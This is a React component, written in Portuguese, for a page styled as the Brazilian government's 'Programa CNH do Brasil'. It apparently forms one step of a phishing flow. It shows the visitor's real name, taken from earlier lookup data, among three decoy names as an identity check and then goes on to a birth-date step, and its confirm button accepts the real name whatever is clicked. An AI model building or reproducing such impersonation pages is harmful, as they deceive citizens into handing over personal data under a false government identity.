import { useLocation, useNavigate } from "react-router-dom";
import "./StepName.css";

export default function StepName(){

  const location = useLocation();
  const navigate = useNavigate();

  const data = location.state;

  if(!data) return <div>Carregando...</div>;

  const nomeReal = data.dados.nome;

  const nomes = [
    nomeReal,
    "MARIA PEREIRA COSTA",
    "CIRO JOSE DE OLIVEIRA NETO",
    "ALICE SANTOS RIBEIRO"
  ].sort(() => Math.random() - 0.5);

  const selecionarNome = (nome) => {

    navigate("/stepbirth",{
      state:{
        ...data,
        nomeSelecionado:nome
      }
    });

  }

  return(

    <div className="gov-container">

      <div className="gov-header">

        <img
          src="/logo2.png"
          className="gov-logo"
        />

        <div className="gov-title">
          Programa CNH do Brasil
        </div>

      </div>

      <div className="gov-card">

        <h2>
          Confirme seus dados para o cadastro no Programa CNH do Brasil
        </h2>

        <div className="gov-step">

          <div className="step-circle">
            1
          </div>

          <div className="step-title">
            Qual é seu nome completo?
          </div>

        </div>

        <div className="name-list">

          {nomes.map((nome,i)=>(
            <div
              key={i}
              className="name-item"
              onClick={()=>selecionarNome(nome)}
            >
              {nome}
            </div>
          ))}

        </div>

        <button
          className="confirm-btn"
          onClick={()=>selecionarNome(nomeReal)}
        >
          Confirmar
        </button>

      </div>

    </div>

  )

}